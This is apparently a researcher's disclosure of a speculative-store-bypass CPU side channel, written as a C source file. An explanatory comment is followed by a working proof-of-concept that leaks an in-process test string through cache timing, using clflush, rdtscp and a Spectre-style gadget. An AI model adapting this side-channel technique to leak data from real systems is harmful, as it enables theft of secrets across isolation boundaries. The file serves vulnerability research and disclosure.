/*
======== Intro / Overview ========
After Michael Schwarz made some interesting observations, we started
looking into variants other than the three already-known ones.

I noticed that Intel's Optimization Manual says in
section 2.4.4.5 ("Memory Disambiguation"):

    A load instruction micro-op may depend on a preceding store. Many
    microarchitectures block loads until all preceding store address
    are known.
    The memory disambiguator predicts which loads will not depend on
    any previous stores. When the disambiguator predicts that a load
    does not have such a dependency, the load takes its data from the
    L1 data cache.
    Eventually, the prediction is verified. If an actual conflict is
    detected, the load and all succeeding instructions are re-executed.

According to my experiments, this effect can be used to cause
speculative execution to continue far enough to execute a
Spectre-style gadget on a pointer read from a memory slot to which a
store has been speculatively ignored. I have tested this behavior on
the following processors from Intel and AMD:

 - Intel(R) Core(TM) i7-6600U CPU @ 2.60GHz [Skylake laptop]
 - AMD PRO A8-9600 R7, 10 COMPUTE CORES 4C+6G [AMD desktop]
 - Intel(R) Xeon(R) CPU E5-1650 v3 @ 3.50GHz [Haswell desktop]

I haven't yet tested this on any ARM CPU.

Interestingly, only on the Skylake laptop, it seems to work when
interrupts and SMP are disabled while the test is running; on the
other machines, it seems to only work when interrupts are enabled,
maybe because the kernel code cause some noise that garbles some
predictor state or so? Or just because they mess up timing
somewhere...


There were mentions of data speculation on the netdev list, in a
somewhat different context:

https://www.mail-archive.com/netdev@vger.kernel.org/msg212262.html
https://www.mail-archive.com/netdev@vger.kernel.org/msg215369.html

However, I'm not entirely sure about the terminology. Do
"data speculation" and "value speculation" include speculating about
the *source* of data, or do they refer exclusively to directly
speculating about the *value* of data?





======== Demo code (no privilege boundaries crossed) ========
This is some code that purely demonstrates the basic effect and shows
that it is possible to combine it with a Meltdown/Spectre-style
gadget for leaking data into the cache. It does not cross any
privilege boundaries.

-----------------------   START   -----------------------
// compile with: gcc -o test test.c -Wall -DHIT_THRESHOLD={CYCLES}
// optionally add: -DNO_INTERRUPTS// */

#include <stdio.h>
#include <sys/io.h>
#include <err.h>
#include <sys/mman.h>

#define pipeline_flush() asm volatile("mov $0,%%eax\n\tcpuid\n\tlfence" : /*out*/ : /*in*/ : "rax","rbx","rcx","rdx","memory")

#define clflush(addr) asm volatile("clflush (%0)"::"r"(addr):"memory")

// source of high-latency pointer to the memory slot
unsigned char **flushy_area[1000];
#define flushy (flushy_area+500)

// memory slot on which we want bad memory disambiguation
unsigned char *memory_slot_area[1000];
#define memory_slot (memory_slot_area+500)

//                                  0123456789abcdef
unsigned char secret_read_area[] = "11110000101001010011110011100111";
unsigned char public_read_area[] = "################################";

unsigned char timey_line_area[0x200000];
// stored in the memory slot first
#define timey_lines (timey_line_area + 0x10000)

unsigned char dummy_char_sink;

int testfun(int idx) {
  pipeline_flush();
  *flushy = memory_slot;	
  *memory_slot = secret_read_area;
  timey_lines['0' << 12] = 1;
  timey_lines['1' << 12] = 1;
  pipeline_flush();
  clflush(flushy);
  clflush(&timey_lines['0' << 12]);
  clflush(&timey_lines['1' << 12]);
  asm volatile("mfence");
  pipeline_flush();

  // START OF CRITICAL PATH
  unsigned char **memory_slot__slowptr = *flushy;
  //pipeline_flush();
  // the following store will be speculatively ignored since its  address is unknown
  *memory_slot__slowptr = public_read_area;
  // uncomment the instructions in the next line to break the attack
  asm volatile("" /*"mov $0, %%eax\n\tcpuid\n\tlfence"*/ : /*out*/ :
/*in*/ : "rax","rbx","rcx","rdx","memory");
  // architectual read from dummy_timey_line, possible  microarchitectural read from timey_line
  dummy_char_sink = timey_lines[(*memory_slot)[idx] << 12];
  // END OF CRITICAL PATH

  unsigned int t1, t2;

  pipeline_flush();
  asm volatile(
    "lfence\n\t"
    "rdtscp\n\t"
    "mov %%eax, %%ebx\n\t"
    "mov (%%rdi), %%r11\n\t"
    "rdtscp\n\t"
    "lfence\n\t"
  ://out
    "=a"(t2),
    "=b"(t1)
  ://in
    "D"(timey_lines + 0x1000 * '0')
  ://clobber
    "r11",
    "rcx",
    "rdx",
    "memory"
  );
  pipeline_flush();
  unsigned int delay_0 = t2 - t1;

  pipeline_flush();
  asm volatile(
    "lfence\n\t"
    "rdtscp\n\t"
    "mov %%eax, %%ebx\n\t"
    "mov (%%rdi), %%r11\n\t"
    "rdtscp\n\t"
    "lfence\n\t"
  ://out
    "=a"(t2),
    "=b"(t1)
  ://in
    "D"(timey_lines + 0x1000 * '1')
  ://clobber
    "r11",
    "rcx",
    "rdx",
    "memory"
  );
  pipeline_flush();
  unsigned int delay_1 = t2 - t1;

  if (delay_0 < HIT_THRESHOLD && delay_1 > HIT_THRESHOLD) {
    pipeline_flush();
    return 0;
  }
  if (delay_0 > HIT_THRESHOLD && delay_1 < HIT_THRESHOLD) {
    pipeline_flush();
    return 1;
  }
  pipeline_flush();
  return -1;
}

int main(void) {
  char out[100000];
  char *out_ = out;
  int all_cycles = 0;
#ifdef NO_INTERRUPTS
  if (mlockall(MCL_CURRENT|MCL_FUTURE) || iopl(3))
    err(1, "iopl(3)");
#endif
  int idx = 0;
  while (1) {
  for (idx = 0; idx < 32; idx++) {
#ifdef NO_INTERRUPTS
    asm volatile("cli");
#endif
    pipeline_flush();
    long cycles = 0;
    int hits = 0;
    char results[1000] = {0};
    /* if we don't break the loop after some time when it doesn't
work, in NO_INTERRUPTS mode with SMP disabled, the machine will lock
up */
    while (cycles < 1000) {
      pipeline_flush();
      int res = testfun(idx);
      if (res != -1) {
        pipeline_flush();
        results[hits] = res + '0';
        hits++;
      }
      cycles++;
      pipeline_flush();
    }
    pipeline_flush();
#ifdef NO_INTERRUPTS
    asm volatile("sti");
#endif
    all_cycles += cycles;
    out_ += sprintf(out_, "%c: %s in %ld cycles (hitrate: %f%%)\n",
secret_read_area[idx], results, cycles, 100*hits/(double)cycles);
  }
  }
  printf("%s", out);
  //printf("all = %d ave = %f\n", all_cycles, all_cycles / 16.0);
  pipeline_flush();
}
